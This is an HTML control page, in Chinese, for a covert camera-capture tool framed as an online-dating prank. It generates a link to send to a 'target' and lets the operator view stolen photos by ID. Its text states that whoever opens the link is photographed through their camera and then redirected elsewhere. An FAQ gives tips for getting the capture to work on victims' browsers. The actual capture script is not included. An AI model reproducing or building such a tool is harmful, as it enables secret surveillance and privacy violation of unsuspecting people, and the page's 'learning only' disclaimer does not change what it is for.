<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>网恋翻车之乔碧萝你别跑！！</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    background-color: #f0f0f0;
    min-height: 100vh;
    justify-content: center;
  }
  .container {
    width: 100%;
    max-width: 600px;
    margin: 15px;
    background-color: white;
    padding: 20px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    border-radius: 5px;
    box-sizing: border-box;
  }
  input, button {
    padding: 10px;
    margin: 5px 0;
    border-radius: 5px;
    border: 1px solid #ddd;
    box-sizing: border-box;
  }
  .button-group {
    display: flex;
    justify-content: space-between;
    flex-wrap: wrap;
  }
  button {
    flex: 1 1 auto;
    margin-right: 10px;
    background-color: #4CAF50;
    color: white;
    border: none;
  }
  button:last-child {
    margin-right: 0;
  }
  a {
    word-break: break-all;
  }
</style>
</head>
<body>
<div class="container">
   <script>
   function getCurrentDirectory() {
       var fullUrl = window.location.href;
       return fullUrl.substring(0, fullUrl.lastIndexOf('/') + 1);
   }

   function create() {
       var myid = document.getElementById('myid').value;
       var url = document.getElementById('url').value;
       if (myid === "" || url === ""){
           alert("ID或跳转地址不能为空！");
           return false;
       }
       var currentDirectory = getCurrentDirectory();
       var link = currentDirectory + '?id=' + myid + '&url=' + url;
       var kd = document.getElementById('kd');
       kd.href = 'javascript:void(0)'; // Remove direct link
       kd.innerText = link; 
       kd.style = '';
       kd.onclick = function() { window.open(link, '_blank'); };
   }

   function checkPhoto() {
       var myid = document.getElementById('myid').value;
       if (myid === ""){
           alert("ID不能为空！");
           return false;
       }
       window.open('ck.php?id=' + myid, '_blank');
   }
   </script>
   <p>1.本工具仅做学习交流使用，请勿用于非法用途！后果自负！</p>
   <p>2.懒得做数据库，ID是查看照片的凭证，不要泄露给知道这个平台的人</p>
   <p>3.为节省服务器资源，不定期删除7天前的数据</p>
   <p>输入ID：<input type="text" id="myid" value=''/></p>
   <p>拍摄后跳转到：<input type="text" id="url" value='http://baidu.com'/></p>
   <div class="button-group">
     <button onclick='create();'>生成链接</button>
     <button onclick="checkPhoto();">查看照片</button>
   </div>
   <p>将以下链接地址发送给你要拍摄的对象，对方进入后将会拍摄照片并保存</p>
   <p><a id="kd" style="pointer-events: none;">请先生成链接！</a></p>
   <p>问题一：为什么拍摄的是黑屏？答：因为该浏览器不支持，更换浏览器即可，安卓用户建议直接在QQ内打开链接</p>
   <p>问题二：拍摄的照片不全？答：还没等跳转完成就关闭了页面，数据还没传输完成</p>
</div>
</body>
</html>
